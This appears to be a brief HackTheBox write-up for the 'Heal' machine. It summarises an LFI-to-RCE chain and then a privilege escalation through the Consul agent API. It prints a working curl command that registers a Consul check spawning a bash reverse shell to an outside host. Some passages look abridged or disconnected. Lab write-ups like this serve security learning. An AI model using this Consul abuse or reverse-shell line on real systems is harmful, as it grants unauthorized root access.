Heal is a medium HTB machine were we abuse an `LFI` vulnerability to leak the `Gemfile` file of the Ruby on Rails instance running, getting access to a `SQLite` database allowing us acess to exploit an `RCE` vulnerability. From there, we abuse a service called `consul` to root the machine.

Let's modify the `config.xml` file to add our name and version:

>  The ports 8500, 8600, 8300-8302 are from consul

We can abuse the service to gain a root shell using the info inside this [blog post](https://secarma.com/escaping-restricted-shell-through-insecure-consul-api), we just have to create our own cURL command:
```bash
ron@heal:~$ curl -X PUT "http://127.0.0.1:8500/v1/agent/check/register" -H "Content-Type: application/json" -d '{"ID":"shell1","Name":"shell1","Args":["/bin/bash","-c","/bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1"],"Interval":"60s","Timeout":"60s"}'
```
> It might take some time to receive the shell back
